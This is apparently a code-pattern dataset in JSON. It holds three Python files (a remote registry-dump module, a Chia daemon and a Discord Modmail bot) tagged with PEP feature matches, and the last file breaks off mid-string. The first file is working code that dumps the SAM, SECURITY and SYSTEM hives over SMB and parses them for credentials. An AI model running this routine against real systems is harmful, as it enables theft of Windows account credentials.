{
    "pep_525-pep_567": {
        "0": {
            "file": "import os\nimport asyncio\nfrom pathlib import Path\nfrom concurrent.futures import ProcessPoolExecutor\nfrom tqdm import tqdm\nfrom aiosecretsdump import logger\nfrom pypykatz.registry.offline_parser import OffineRegistry\nfrom aiosmb.commons.interfaces.file import SMBFile\nasync def smb_registry(machine, outfolder = None, show_pbar = False, use_share = 'C$', use_dir = 'temp2'):\n\ttry:\n\t\tlogger.info('[+] Starting REGDUMP on %s' % machine.connection.target.get_hostname_or_ip())\n\t\tlogger.info('[+] REGDUMP listing shares...')\n\t\tshares = {}\n\t\tasync for share, err in machine.list_shares():\n\t\t\tif err is not None:\n\t\t\t\treturn False, err\n\t\t\tshares[share.name] = share\n\t\tif use_share not in shares:\n\t\t\treturn False, Exception('Requested share name %s was not found!' % use_share)\n\t\tlogger.info('[+] REGDUMP creating temp folder on C$...')\n\t\tawait shares[use_share].connect(machine.connection) \n\t\tcurrent_directory = shares[use_share].subdirs['']\n\t\tawait current_directory.list(machine.connection)\n\t\tif use_dir not in current_directory.subdirs:\n\t\t\tlogger.info('[!] REGDUMP Requested subdir was not found! Creating it...')\n\t\t\t_, err = await current_directory.create_subdir(use_dir, machine.connection)\n\t\t\tif err is not None:\n\t\t\t\tlogger.info('[-] REGDUMP Failed to create requested directory \"%s\" Reason: %s' % (use_dir, str(err)))\n\t\t\t\treturn err\n\t\t\tawait current_directory.list(machine.connection)\n\t\tbpath = '%s:\\\\%s' % (use_share[0], use_dir)\n\t\tuncbp = '\\\\%s\\\\%s' % (use_share, use_dir)\n\t\tsamh = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])\n\t\tsech = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])\n\t\tsysh = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])\n\t\treshname = {\n\t\t\t'SAM' : '%s\\\\%s' % (bpath, samh),\n\t\t\t'SAM_unc' : '%s\\\\%s' % (uncbp, samh),\n\t\t\t'SECURITY' : '%s\\\\%s' % (bpath, sech),\n\t\t\t'SECURITY_unc' : '%s\\\\%s' % (uncbp, sech),\n\t\t\t'SYSTEM' : '%s\\\\%s' % (bpath, sysh),\n\t\t\t'SYSTEM_unc' : '%s\\\\%s' % (uncbp, sysh),\n\t\t}\n\t\tfor hive_name in ['SAM', 'SECURITY', 'SYSTEM']:\n\t\t\tlogger.info('[+] REGDUMP Dumping %s hive to remote path' % hive_name)\n\t\t\t_, err = await machine.save_registry_hive(hive_name, reshname[hive_name])\n\t\t\tif err is not None:\n\t\t\t\tlogger.info('[-] Failed to dump %s hive' % hive_name)\n\t\t\t\treturn False, err\n\t\tawait asyncio.sleep(5) \n\t\tlogger.info('[+] REGDUMP Dumping part complete, now parsing the files!')\n\t\tpo, err = await parse_regfiles(machine, reshname['SAM_unc'], reshname['SYSTEM_unc'], reshname['SECURITY_unc'])\n\t\tif err is not None:\n\t\t\tlogger.error('[-] REGDUMP Failed to parse the registry hive files remotely!')\n\t\t\tif outfolder is None:\n\t\t\t\tlogger.info('[+] REGDUMP no output folder specified, skipping downloading unparsable registry hives!')\n\t\t\t\treturn False, None\n\t\t\tlogger.info('[+] REGDUMP Downloading registry files as failsafe')\n\t\t\tfor uname in ['SAM_unc', 'SECURITY_unc', 'SYSTEM_unc']:\n\t\t\t\tfile_name = uname.split('_')[0] + '.reg'\n\t\t\t\tfile_obj = SMBFile.from_remotepath(machine.connection, reshname[uname])\n\t\t\t\ttry:\n\t\t\t\t\twith tqdm(desc = 'Downloading %s' % file_name, total=file_obj.size, unit='B', unit_scale=True, unit_divisor=1024) as pbar:\n\t\t\t\t\t\twith open(outfolder.joinpath(file_name), 'wb') as outfile:\n\t\t\t\t\t\t\tasync for data, err in machine.get_file_data(file_obj):\n\t\t\t\t\t\t\t\tif err is not None:\n\t\t\t\t\t\t\t\t\traise err\n\t\t\t\t\t\t\t\tif data is None:\n\t\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\toutfile.write(data)\n\t\t\t\t\t\t\t\tpbar.update(len(data))\n\t\t\t\texcept Exception as e:\n\t\t\t\t\tlogger.error('[-] REGDUMP failed to retrieve %s' % file_name)\n\t\t\t\tfinally:\n\t\t\t\t\tawait file_obj.close()\n\t\t\t\tlogger.info('[+] REGDUMP Sucsessfully downloaded %s' % file_name)\n\t\telse:\n\t\t\tif outfolder is None:\n\t\t\t\tprint(str(po))\n\t\t\telse:\n\t\t\t\twith open(outfolder.joinpath('results.txt'), 'w') as f:\n\t\t\t\t\tf.write(str(po))\n\t\treturn True, None\n\texcept Exception as e:\n\t\treturn False, e\n\tfinally:\n\t\tlogger.info('[+] REGDUMP Removing hive files from remote system')\n\t\tfor uname in ['SAM_unc', 'SECURITY_unc', 'SYSTEM_unc']:\n\t\t\t_, err = await SMBFile.delete_unc(machine.connection, reshname[uname])\n\t\t\tif err is not None:\n\t\t\t\tlogger.warning('[+] REGDUMP Failed to clear up hive file %s' % reshname[uname])\n\t\tlogger.info('[+] REGDUMP on %s finished!' % machine.connection.target.get_hostname_or_ip())\nasync def wmi_registry(machine):\n\tpass\nasync def powershell_registry(machine):\n\tpass\ndef parse_regfiles_blocking(sam_file, system_file, security_file, sam_unc, system_unc, security_unc):\n\ttry:\n\t\tsystem_file.open(system_unc, 'rb')\n\t\tsam_file.open(sam_unc, 'rb')\n\t\tsecurity_file.open(security_unc, 'rb')\n\t\tpo = OffineRegistry.from_files(system_file, sam_path = sam_file, security_path = security_file, notfile = True)\n\t\treturn po, None\n\texcept Exception as e:\n\t\treturn None, e\nasync def parse_regfiles(machine, sam_unc, system_unc, security_unc):\n\ttry:\n\t\tsystem_file = machine.get_blocking_file()\n\t\tsam_file = machine.get_blocking_file()\n\t\tsecurity_file = machine.get_blocking_file()\n\t\tloop = asyncio.get_event_loop()\n\t\twith ProcessPoolExecutor() as process_executor:\n\t\t\tcoro = loop.run_in_executor(process_executor, parse_regfiles_blocking, sam_file, system_file, security_file, sam_unc, system_unc, security_unc)\n\t\t\tpo, err = await coro\n\t\t\tif err is not None:\n\t\t\t\treturn None, err\n\t\treturn po, None\n\texcept Exception as e:\n\t\treturn False, e",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        14,
                        17,
                        "async for",
                        "async for share, err in machine.list_shares():\n\t\t\tif err is not None:\n\t\t\t\treturn False, err\n\t\t\tshares[share.name] = share"
                    ],
                    [
                        65,
                        71,
                        "async for",
                        "async for data, err in machine.get_file_data(file_obj):\n\t\t\t\t\t\t\t\tif err is not None:\n\t\t\t\t\t\t\t\t\traise err\n\t\t\t\t\t\t\t\tif data is None:\n\t\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\toutfile.write(data)\n\t\t\t\t\t\t\t\tpbar.update(len(data))"
                    ]
                ],
                "pep_498v": [
                    [
                        31,
                        31,
                        "%"
                    ],
                    [
                        32,
                        32,
                        "%"
                    ],
                    [
                        33,
                        33,
                        "%"
                    ],
                    [
                        34,
                        34,
                        "%"
                    ],
                    [
                        35,
                        35,
                        "%"
                    ],
                    [
                        11,
                        11,
                        "%"
                    ],
                    [
                        37,
                        37,
                        "%"
                    ],
                    [
                        38,
                        38,
                        "%"
                    ],
                    [
                        39,
                        39,
                        "%"
                    ],
                    [
                        40,
                        40,
                        "%"
                    ],
                    [
                        41,
                        41,
                        "%"
                    ],
                    [
                        42,
                        42,
                        "%"
                    ],
                    [
                        92,
                        92,
                        "%"
                    ],
                    [
                        45,
                        45,
                        "%"
                    ],
                    [
                        19,
                        19,
                        "%"
                    ],
                    [
                        28,
                        28,
                        "%"
                    ],
                    [
                        48,
                        48,
                        "%"
                    ],
                    [
                        76,
                        76,
                        "%"
                    ],
                    [
                        91,
                        91,
                        "%"
                    ],
                    [
                        73,
                        73,
                        "%"
                    ],
                    [
                        63,
                        63,
                        "%"
                    ]
                ]
            }
        },
        "1": {
            "file": "import asyncio\nimport json\nimport logging\nimport os\nimport signal\nimport subprocess\nimport sys\nimport traceback\nfrom typing import Dict, Any, List, Tuple, Optional\nfrom sys import platform\nfrom websockets import serve, ConnectionClosedOK, WebSocketException\ntry:\n    from aiohttp import web\nexcept ModuleNotFoundError:\n    print(\n        \"Error: Make sure to run . ./activate from the project folder before starting Chia.\"\n    )\n    quit()\nfrom src.cmds.init import chia_init\nfrom src.daemon.windows_signal import kill\nfrom src.util.ws_message import format_response\nfrom src.util.json_util import dict_to_json_str\ntry:\n    import fcntl\n    has_fcntl = True\nexcept ImportError:\n    has_fcntl = False\nfrom src.util.config import load_config\nfrom src.util.logging import initialize_logging\nfrom src.util.path import mkdir\nfrom src.util.service_groups import validate_service\nlog = logging.getLogger(__name__)\nif getattr(sys, \"frozen\", False):\n    name_map = {\n        \"chia\": \"chia\",\n        \"chia_wallet\": \"start_wallet\",\n        \"chia_full_node\": \"start_full_node\",\n        \"chia_harvester\": \"start_harvester\",\n        \"chia_farmer\": \"start_farmer\",\n        \"chia_introducer\": \"start_introducer\",\n        \"chia_timelord\": \"start_timelord\",\n        \"chia_timelord_launcher\": \"timelord_launcher\",\n        \"chia_full_node_simulator\": \"start_simulator\",\n    }\n    def executable_for_service(service_name):\n        application_path = os.path.dirname(sys.executable)\n        if platform == \"win32\" or platform == \"cygwin\":\n            executable = name_map[service_name]\n            path = f\"{application_path}/{executable}.exe\"\n            return path\n        else:\n            path = f\"{application_path}/{name_map[service_name]}\"\n            return path\nelse:\n    application_path = os.path.dirname(__file__)\n    def executable_for_service(service_name):\n        return service_name\nclass WebSocketServer:\n    def __init__(self, root_path):\n        self.root_path = root_path\n        self.log = log\n        self.services: Dict = dict()\n        self.connections: Dict[str, List[Any]] = dict()  \n        self.remote_address_map: Dict[str, str] = dict()  \n        self.ping_job = None\n        net_config = load_config(root_path, \"config.yaml\")\n        self.self_hostname = net_config[\"self_hostname\"]\n        self.daemon_port = net_config[\"daemon_port\"]\n    async def start(self):\n        self.log.info(\"Starting Daemon Server\")\n        def master_close_cb():\n            asyncio.ensure_future(self.stop())\n        try:\n            asyncio.get_running_loop().add_signal_handler(\n                signal.SIGINT, master_close_cb\n            )\n            asyncio.get_running_loop().add_signal_handler(\n                signal.SIGTERM, master_close_cb\n            )\n        except NotImplementedError:\n            self.log.info(\"Not implemented\")\n        self.websocket_server = await serve(\n            self.safe_handle,\n            self.self_hostname,\n            self.daemon_port,\n            max_size=None,\n            ping_interval=500,\n            ping_timeout=300,\n        )\n        self.log.info(\"Waiting Daemon WebSocketServer closure\")\n        print(\"Daemon server started\", flush=True)\n        await self.websocket_server.wait_closed()\n        self.log.info(\"Daemon WebSocketServer closed\")\n    def cancel_task_safe(self, task):\n        if task is not None:\n            try:\n                task.cancel()\n            except Exception as e:\n                self.log.error(f\"Error while canceling task.{e} {task}\")\n    async def stop(self):\n        self.cancel_task_safe(self.ping_job)\n        await self.exit()\n        self.websocket_server.close()\n        return {\"success\": True}\n    async def safe_handle(self, websocket, path):\n        service_name = \"\"\n        try:\n            async for message in websocket:\n                try:\n                    decoded = json.loads(message)\n                    response, sockets_to_use = await self.handle_message(\n                        websocket, decoded\n                    )\n                except Exception as e:\n                    tb = traceback.format_exc()\n                    self.log.error(f\"Error while handling message: {tb}\")\n                    error = {\"success\": False, \"error\": f\"{e}\"}\n                    response = format_response(message, error)\n                if len(sockets_to_use) > 0:\n                    for socket in sockets_to_use:\n                        try:\n                            await socket.send(response)\n                        except Exception as e:\n                            tb = traceback.format_exc()\n                            self.log.error(\n                                f\"Unexpected exception trying to send to websocket: {e} {tb}\"\n                            )\n                            self.remove_connection(socket)\n                            await socket.close()\n        except Exception as e:\n            remote_address = websocket.remote_address[1]\n            tb = traceback.format_exc()\n            service_name = \"Unknown\"\n            if remote_address in self.remote_address_map:\n                service_name = self.remote_address_map[remote_address]\n            if isinstance(e, ConnectionClosedOK):\n                self.log.info(\n                    f\"ConnectionClosedOk. Closing websocket with {service_name} {e}\"\n                )\n            elif isinstance(e, WebSocketException):\n                self.log.info(\n                    f\"Websocket exception. Closing websocket with {service_name} {e} {tb}\"\n                )\n            else:\n                self.log.error(f\"Unexpected exception in websocket: {e} {tb}\")\n        finally:\n            self.remove_connection(websocket)\n            await websocket.close()\n    def remove_connection(self, websocket):\n        remote_address = websocket.remote_address[1]\n        service_name = None\n        if remote_address in self.remote_address_map:\n            service_name = self.remote_address_map[remote_address]\n            self.remote_address_map.pop(remote_address)\n        if service_name in self.connections:\n            after_removal = []\n            for connection in self.connections[service_name]:\n                if connection.remote_address[1] == remote_address:\n                    continue\n                else:\n                    after_removal.append(connection)\n            self.connections[service_name] = after_removal\n    async def ping_task(self):\n        restart = True\n        await asyncio.sleep(30)\n        for remote_address, service_name in self.remote_address_map.items():\n            if service_name in self.connections:\n                sockets = self.connections[service_name]\n                for socket in sockets:\n                    try:\n                        self.log.info(f\"About to ping: {service_name}:{socket}\")\n                        await socket.ping()\n                    except asyncio.CancelledError:\n                        self.log.info(\"Ping task received Cancel\")\n                        restart = False\n                        break\n                    except Exception as e:\n                        self.log.info(f\"Ping error: {e}\")\n                        self.log.warning(\"Ping failed, connection closed.\")\n                        self.remove_connection(socket)\n                        await socket.close()\n        if restart is True:\n            self.ping_job = asyncio.create_task(self.ping_task())\n    async def handle_message(\n        self, websocket, message\n    ) -> Tuple[Optional[str], List[Any]]:\n        command = message[\"command\"]\n        destination = message[\"destination\"]\n        if destination != \"daemon\":\n            destination = message[\"destination\"]\n            if destination in self.connections:\n                sockets = self.connections[destination]\n                return dict_to_json_str(message), sockets\n            return None, []\n        data = None\n        if \"data\" in message:\n            data = message[\"data\"]\n        if command == \"ping\":\n            response = await self.ping()\n        elif command == \"start_service\":\n            response = await self.start_service(data)\n        elif command == \"start_plotting\":\n            response = await self.start_plotting(data)\n        elif command == \"stop_service\":\n            response = await self.stop_service(data)\n        elif command == \"is_running\":\n            response = await self.is_running(data)\n        elif command == \"exit\":\n            response = await self.stop()\n        elif command == \"register_service\":\n            response = await self.register_service(websocket, data)\n        else:\n            self.log.error(f\"UK>> {message}\")\n            response = {\"success\": False, \"error\": f\"unknown_command {command}\"}\n        full_response = format_response(message, response)\n        return (full_response, [websocket])\n    async def ping(self):\n        response = {\"success\": True, \"value\": \"pong\"}\n        return response\n    async def start_plotting(self, request):\n        service_name = request[\"service\"]\n        k = request[\"k\"]\n        n = request[\"n\"]\n        t = request[\"t\"]\n        t2 = request[\"t2\"]\n        d = request[\"d\"]\n        b = request[\"b\"]\n        command_args: List[str] = []\n        command_args += service_name.split(\" \")\n        command_args.append(f\"-k={k}\")\n        command_args.append(f\"-n={n}\")\n        command_args.append(f\"-t={t}\")\n        command_args.append(f\"-2={t2}\")\n        command_args.append(f\"-d={d}\")\n        command_args.append(f\"-b={b}\")\n        error = None\n        success = False\n        if service_name in self.services:\n            service = self.services[service_name]\n            r = service is not None and service.poll() is None\n            if r is False:\n                self.services.pop(service_name)\n                error = None\n            else:\n                error = \"already running\"\n        if error is None:\n            try:\n                self.log.info(f\"Start potting: {command_args}\")\n                process, pid_path = launch_plotter(\n                    self.root_path, service_name, command_args\n                )\n                self.services[service_name] = process\n                success = True\n            except (subprocess.SubprocessError, IOError):\n                log.exception(f\"problem starting {service_name}\")\n                error = \"start failed\"\n        response = {\n            \"success\": success,\n            \"service\": service_name,\n            \"out_file\": f\"{plotter_log_path(self.root_path).absolute()}\",\n            \"error\": error,\n        }\n        return response\n    async def start_service(self, request):\n        service_command = request[\"service\"]\n        error = None\n        success = False\n        testing = False\n        if \"testing\" in request:\n            testing = request[\"testing\"]\n        if not validate_service(service_command):\n            error = \"unknown service\"\n        if service_command in self.services:\n            service = self.services[service_command]\n            r = service is not None and service.poll() is None\n            if r is False:\n                self.services.pop(service_command)\n                error = None\n            else:\n                error = \"already running\"\n        if error is None:\n            try:\n                exe_command = service_command\n                if testing is True:\n                    exe_command = f\"{service_command} --testing=true\"\n                process, pid_path = launch_service(self.root_path, exe_command)\n                self.services[service_command] = process\n                success = True\n            except (subprocess.SubprocessError, IOError):\n                log.exception(f\"problem starting {service_command}\")\n                error = \"start failed\"\n        response = {\"success\": success, \"service\": service_command, \"error\": error}\n        return response\n    async def stop_service(self, request):\n        service_name = request[\"service\"]\n        result = await kill_service(self.root_path, self.services, service_name)\n        response = {\"success\": result, \"service_name\": service_name}\n        return response\n    async def is_running(self, request):\n        service_name = request[\"service\"]\n        process = self.services.get(service_name)\n        r = process is not None and process.poll() is None\n        if service_name == \"chia plots create\":\n            response = {\n                \"success\": True,\n                \"service_name\": service_name,\n                \"is_running\": r,\n                \"out_file\": f\"{plotter_log_path(self.root_path).absolute()}\",\n            }\n        else:\n            response = {\"success\": True, \"service_name\": service_name, \"is_running\": r}\n        return response\n    async def exit(self):\n        jobs = []\n        for k in self.services.keys():\n            jobs.append(kill_service(self.root_path, self.services, k))\n        if jobs:\n            await asyncio.wait(jobs)\n        self.services.clear()\n        asyncio.get_event_loop().call_later(5, lambda *args: sys.exit(0))\n        log.info(\"chia daemon exiting in 5 seconds\")\n        response = {\"success\": True}\n        return response\n    async def register_service(self, websocket, request):\n        self.log.info(f\"Register service {request}\")\n        service = request[\"service\"]\n        if service not in self.connections:\n            self.connections[service] = []\n        self.connections[service].append(websocket)\n        self.remote_address_map[websocket.remote_address[1]] = service\n        if self.ping_job is None:\n            self.ping_job = asyncio.create_task(self.ping_task())\n        response = {\"success\": True}\n        self.log.info(f\"registered for service {service}\")\n        return response\ndef daemon_launch_lock_path(root_path):\n    return root_path / \"run\" / \"start-daemon.launching\"\ndef pid_path_for_service(root_path, service):\n    pid_name = service.replace(\" \", \"-\").replace(\"/\", \"-\")\n    return root_path / \"run\" / f\"{pid_name}.pid\"\ndef plotter_log_path(root_path):\n    return root_path / \"plotter\" / \"plotter_log.txt\"\ndef launch_plotter(root_path, service_name, service_array):\n    os.environ[\"CHIA_ROOT\"] = str(root_path)\n    service_executable = executable_for_service(service_array[0])\n    service_array[0] = service_executable\n    startupinfo = None\n    if os.name == \"nt\":\n        startupinfo = subprocess.STARTUPINFO()  \n        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  \n    plotter_path = plotter_log_path(root_path)\n    if plotter_path.parent.exists():\n        if plotter_path.exists():\n            plotter_path.unlink()\n    else:\n        mkdir(plotter_path.parent)\n    outfile = open(plotter_path.resolve(), \"w\")\n    log.info(f\"Service array: {service_array}\")\n    process = subprocess.Popen(\n        service_array, shell=False, stdout=outfile, startupinfo=startupinfo\n    )\n    pid_path = pid_path_for_service(root_path, service_name)\n    try:\n        mkdir(pid_path.parent)\n        with open(pid_path, \"w\") as f:\n            f.write(f\"{process.pid}\\n\")\n    except Exception:\n        pass\n    return process, pid_path\ndef launch_service(root_path, service_command):\n    os.environ[\"CHIA_ROOT\"] = str(root_path)\n    service_array = service_command.split()\n    service_executable = executable_for_service(service_array[0])\n    service_array[0] = service_executable\n    startupinfo = None\n    if os.name == \"nt\":\n        startupinfo = subprocess.STARTUPINFO()  \n        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  \n    if platform == \"win32\" or platform == \"cygwin\":\n        creationflags = subprocess.CREATE_NEW_PROCESS_GROUP\n    else:\n        creationflags = 0\n    process = subprocess.Popen(\n        service_array,\n        shell=False,\n        startupinfo=startupinfo,\n        creationflags=creationflags,\n    )\n    pid_path = pid_path_for_service(root_path, service_command)\n    try:\n        mkdir(pid_path.parent)\n        with open(pid_path, \"w\") as f:\n            f.write(f\"{process.pid}\\n\")\n    except Exception:\n        pass\n    return process, pid_path\nasync def kill_service(root_path, services, service_name, delay_before_kill=15) -> bool:\n    process = services.get(service_name)\n    if process is None:\n        return False\n    del services[service_name]\n    pid_path = pid_path_for_service(root_path, service_name)\n    if platform == \"win32\" or platform == \"cygwin\":\n        log.info(\"sending CTRL_BREAK_EVENT signal to %s\", service_name)\n        kill(process.pid, signal.SIGBREAK)  \n    else:\n        log.info(\"sending term signal to %s\", service_name)\n        process.terminate()\n    count = 0\n    while count < delay_before_kill:\n        if process.poll() is not None:\n            break\n        await asyncio.sleep(1)\n        count += 1\n    else:\n        process.kill()\n        log.info(\"sending kill signal to %s\", service_name)\n    r = process.wait()\n    log.info(\"process %s returned %d\", service_name, r)\n    try:\n        pid_path_killed = pid_path.with_suffix(\".pid-killed\")\n        if pid_path_killed.exists():\n            pid_path_killed.unlink()\n        os.rename(pid_path, pid_path_killed)\n    except Exception:\n        pass\n    return True\ndef is_running(services, service_name):\n    process = services.get(service_name)\n    return process is not None and process.poll() is None\ndef create_server_for_daemon(root_path):\n    routes = web.RouteTableDef()\n    services: Dict = dict()\n    @routes.get(\"/daemon/ping/\")\n    async def ping(request):\n        return web.Response(text=\"pong\")\n    @routes.get(\"/daemon/service/start/\")\n    async def start_service(request):\n        service_name = request.query.get(\"service\")\n        if not validate_service(service_name):\n            r = \"unknown service\"\n            return web.Response(text=str(r))\n        if is_running(services, service_name):\n            r = \"already running\"\n            return web.Response(text=str(r))\n        try:\n            process, pid_path = launch_service(root_path, service_name)\n            services[service_name] = process\n            r = \"started\"\n        except (subprocess.SubprocessError, IOError):\n            log.exception(f\"problem starting {service_name}\")\n            r = \"start failed\"\n        return web.Response(text=str(r))\n    @routes.get(\"/daemon/service/stop/\")\n    async def stop_service(request):\n        service_name = request.query.get(\"service\")\n        r = await kill_service(root_path, services, service_name)\n        return web.Response(text=str(r))\n    @routes.get(\"/daemon/service/is_running/\")\n    async def is_running_handler(request):\n        service_name = request.query.get(\"service\")\n        r = is_running(services, service_name)\n        return web.Response(text=str(r))\n    @routes.get(\"/daemon/exit/\")\n    async def exit(request):\n        jobs = []\n        for k in services.keys():\n            jobs.append(kill_service(root_path, services, k))\n        if jobs:\n            await asyncio.wait(jobs)\n        services.clear()\ndef singleton(lockfile, text=\"semaphore\"):\n    if not lockfile.parent.exists():\n        mkdir(lockfile.parent)\n    try:\n        if has_fcntl:\n            f = open(lockfile, \"w\")\n            fcntl.lockf(f, fcntl.LOCK_EX | fcntl.LOCK_NB)\n        else:\n            if lockfile.exists():\n                lockfile.unlink()\n            fd = os.open(lockfile, os.O_CREAT | os.O_EXCL | os.O_RDWR)\n            f = open(fd, \"w\")\n        f.write(text)\n    except IOError:\n        return None\n    return f\nasync def async_run_daemon(root_path):\n    chia_init(root_path)\n    config = load_config(root_path, \"config.yaml\")\n    initialize_logging(\"daemon\", config[\"logging\"], root_path)\n    lockfile = singleton(daemon_launch_lock_path(root_path))\n    if lockfile is None:\n        print(\"daemon: already launching\")\n        return 2\n    create_server_for_daemon(root_path)\n    log.info(\"before start\")\n    ws_server = WebSocketServer(root_path)\n    await ws_server.start()\ndef run_daemon(root_path):\n    return asyncio.get_event_loop().run_until_complete(async_run_daemon(root_path))\ndef main():\n    from src.util.default_root import DEFAULT_ROOT_PATH\n    return run_daemon(DEFAULT_ROOT_PATH)\nif __name__ == \"__main__\":\n    main()",
            "patterns": {
                "pep_526": [
                    [
                        433,
                        "services: Dict = dict()"
                    ],
                    [
                        62,
                        "self.services: Dict = dict()"
                    ],
                    [
                        63,
                        "self.connections: Dict[str, List[Any]] = dict()"
                    ],
                    [
                        64,
                        "self.remote_address_map: Dict[str, str] = dict()"
                    ],
                    [
                        228,
                        "command_args: List[str] = []"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        9,
                        "from typing import Dict, Any, List, Tuple, Optional",
                        "suggestion"
                    ],
                    [
                        9,
                        "from typing import Dict, Any, List, Tuple, Optional",
                        "suggestion"
                    ],
                    [
                        9,
                        "from typing import Dict, Any, List, Tuple, Optional",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        63,
                        "        self.connections: Dict[str, List[Any]] = dict()  ",
                        "violation"
                    ],
                    [
                        64,
                        "        self.remote_address_map: Dict[str, str] = dict()  ",
                        "violation"
                    ],
                    [
                        228,
                        "        command_args: List[str] = []",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        108,
                        129,
                        "async for",
                        "async for message in websocket:\n                try:\n                    decoded = json.loads(message)\n                    response, sockets_to_use = await self.handle_message(\n                        websocket, decoded\n                    )\n                except Exception as e:\n                    tb = traceback.format_exc()\n                    self.log.error(f\"Error while handling message: {tb}\")\n                    error = {\"success\": False, \"error\": f\"{e}\"}\n                    response = format_response(message, error)\n                if len(sockets_to_use) > 0:\n                    for socket in sockets_to_use:\n                        try:\n                            await socket.send(response)\n                        except Exception as e:\n                            tb = traceback.format_exc()\n                            self.log.error(\n                                f\"Unexpected exception trying to send to websocket: {e} {tb}\"\n                            )\n                            self.remove_connection(socket)\n                            await socket.close()"
                    ]
                ],
                "pep_498": [
                    [
                        340,
                        "    return root_path / \"run\" / f\"{pid_name}.pid\""
                    ],
                    [
                        358,
                        "    log.info(f\"Service array: {service_array}\")"
                    ],
                    [
                        49,
                        "            path = f\"{application_path}/{executable}.exe\""
                    ],
                    [
                        52,
                        "            path = f\"{application_path}/{name_map[service_name]}\""
                    ],
                    [
                        230,
                        "        command_args.append(f\"-k={k}\")"
                    ],
                    [
                        231,
                        "        command_args.append(f\"-n={n}\")"
                    ],
                    [
                        232,
                        "        command_args.append(f\"-t={t}\")"
                    ],
                    [
                        233,
                        "        command_args.append(f\"-2={t2}\")"
                    ],
                    [
                        234,
                        "        command_args.append(f\"-d={d}\")"
                    ],
                    [
                        235,
                        "        command_args.append(f\"-b={b}\")"
                    ],
                    [
                        260,
                        "            \"out_file\": f\"{plotter_log_path(self.root_path).absolute()}\","
                    ],
                    [
                        325,
                        "        self.log.info(f\"Register service {request}\")"
                    ],
                    [
                        334,
                        "        self.log.info(f\"registered for service {service}\")"
                    ],
                    [
                        308,
                        "                \"out_file\": f\"{plotter_log_path(self.root_path).absolute()}\","
                    ],
                    [
                        366,
                        "            f.write(f\"{process.pid}\\n\")"
                    ],
                    [
                        393,
                        "            f.write(f\"{process.pid}\\n\")"
                    ],
                    [
                        248,
                        "                self.log.info(f\"Start potting: {command_args}\")"
                    ],
                    [
                        285,
                        "                    exe_command = f\"{service_command} --testing=true\""
                    ],
                    [
                        451,
                        "            log.exception(f\"problem starting {service_name}\")"
                    ],
                    [
                        99,
                        "                self.log.error(f\"Error while canceling task.{e} {task}\")"
                    ],
                    [
                        138,
                        "                    f\"ConnectionClosedOk. Closing websocket with {service_name} {e}\""
                    ],
                    [
                        255,
                        "                log.exception(f\"problem starting {service_name}\")"
                    ],
                    [
                        290,
                        "                log.exception(f\"problem starting {service_command}\")"
                    ],
                    [
                        116,
                        "                    self.log.error(f\"Error while handling message: {tb}\")"
                    ],
                    [
                        117,
                        "                    error = {\"success\": False, \"error\": f\"{e}\"}"
                    ],
                    [
                        142,
                        "                    f\"Websocket exception. Closing websocket with {service_name} {e} {tb}\""
                    ],
                    [
                        145,
                        "                self.log.error(f\"Unexpected exception in websocket: {e} {tb}\")"
                    ],
                    [
                        171,
                        "                        self.log.info(f\"About to ping: {service_name}:{socket}\")"
                    ],
                    [
                        178,
                        "                        self.log.info(f\"Ping error: {e}\")"
                    ],
                    [
                        126,
                        "                                f\"Unexpected exception trying to send to websocket: {e} {tb}\""
                    ],
                    [
                        213,
                        "            self.log.error(f\"UK>> {message}\")"
                    ],
                    [
                        214,
                        "            response = {\"success\": False, \"error\": f\"unknown_command {command}\"}"
                    ]
                ]
            }
        },
        "2": {
            "file": "import asyncio\nimport logging\nimport os\nimport re\nimport string\nimport typing\nfrom datetime import datetime, timedelta\nfrom types import SimpleNamespace as param\nimport discord\nimport isodate\nfrom discord.ext.commands import MissingRequiredArgument, CommandError\nfrom core.time import human_timedelta\nfrom core.utils import is_image_url, days, match_user_id\nfrom core.utils import truncate, ignore, error\nlogger = logging.getLogger(\"Modmail\")\nclass Thread:\n    def __init__(\n        self,\n        manager: \"ThreadManager\",\n        recipient: typing.Union[discord.Member, discord.User, int],\n        channel: typing.Union[discord.DMChannel, discord.TextChannel] = None,\n    ):\n        self.manager = manager\n        self.bot = manager.bot\n        if isinstance(recipient, int):\n            self._id = recipient\n            self._recipient = None\n        else:\n            if recipient.bot:\n                raise CommandError(\"Recipient cannot be a bot.\")\n            self._id = recipient.id\n            self._recipient = recipient\n        self._channel = channel\n        self.genesis_message = None\n        self._ready_event = asyncio.Event()\n        self.close_task = None\n        self.auto_close_task = None\n    def __repr__(self):\n        return (\n            f'Thread(recipient=\"{self.recipient or self.id}\", '\n            f\"channel={self.channel.id})\"\n        )\n    async def wait_until_ready(self) -> None:\n        await self._ready_event.wait()\n    @property\n    def id(self) -> int:\n        return self._id\n    @property\n    def channel(self) -> typing.Union[discord.TextChannel, discord.DMChannel]:\n        return self._channel\n    @property\n    def recipient(self) -> typing.Optional[typing.Union[discord.User, discord.Member]]:\n        return self._recipient\n    @property\n    def ready(self) -> bool:\n        return self._ready_event.is_set()\n    @ready.setter\n    def ready(self, flag: bool):\n        if flag:\n            self._ready_event.set()\n        else:\n            self._ready_event.clear()\n    async def setup(self, *, creator=None, category=None):\n        self.bot.dispatch(\"thread_create\", self)\n        recipient = self.recipient\n        overwrites = {\n            self.bot.modmail_guild.default_role: discord.PermissionOverwrite(\n                read_messages=False\n            )\n        }\n        category = category or self.bot.main_category\n        if category is not None:\n            overwrites = None\n        try:\n            channel = await self.bot.modmail_guild.create_text_channel(\n                name=self.manager.format_channel_name(recipient),\n                category=category,\n                overwrites=overwrites,\n                reason=\"Creating a thread channel\",\n            )\n        except discord.HTTPException as e:  \n            del self.manager.cache[self.id]\n            log_channel = self.bot.log_channel\n            em = discord.Embed(color=discord.Color.red())\n            em.title = \"Error while trying to create a 